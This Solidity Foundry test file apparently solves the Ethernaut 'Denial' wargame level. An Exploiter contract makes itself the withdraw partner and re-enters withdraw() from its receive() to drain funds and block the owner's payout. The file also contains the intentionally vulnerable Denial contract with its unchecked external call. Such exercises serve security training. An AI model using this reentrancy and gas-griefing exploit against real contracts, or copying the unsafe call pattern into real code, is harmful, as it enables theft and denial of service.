// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

contract DenialTest2 is Test {
    Denial denial;
    Exploiter exploiter;

    function setUp() public {
        denial = Denial(payable(0x6185Be5dF343C299f9424B96A22296A5D4adcb10));
        exploiter = new Exploiter(address(denial));
    }

    function test_fork() public {
        exploiter.setPartner();
        exploiter.exploit();
        exploiter.exploit();
        exploiter.exploit();
        vm.expectRevert();
        denial.withdraw();
        console2.log("Balance: ", denial.contractBalance());
    }
}

contract Exploiter {
    address public immutable denial;    

    constructor(address _instance) {
        denial = _instance;
    }

    function setPartner() external {
        IDenial(denial).setWithdrawPartner(address(this));
    }

    function exploit() external {
        _callContract();
    }

    function donate(uint256 _target) external {
        payable(denial).call{value: _target - denial.balance}("");
    }

    function _callContract() internal {
        while (_call() && address(denial).balance > 200) {
            continue;
        }
    }

    function _call() internal returns (bool success) {
        address target = denial;
        assembly {
            // Allocate memory for call
            let ptr := mload(0x40)
        
            // Store function selector
            mstore(ptr, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
        
            // Call the contract
            success := call(
                gas(),           // Forward all gas
                target,          // Target address
                0,               // No ETH value
                ptr,             // Input data pointer
                4,               // Input data length (4 bytes for selector)
                0,               // Output data pointer
                0                // Output data length
            )
        }
    }

    receive() external payable {
        _callContract();
    }
}

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function partner() external view returns (address);
    function contractBalance() external view returns (uint256);
}

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}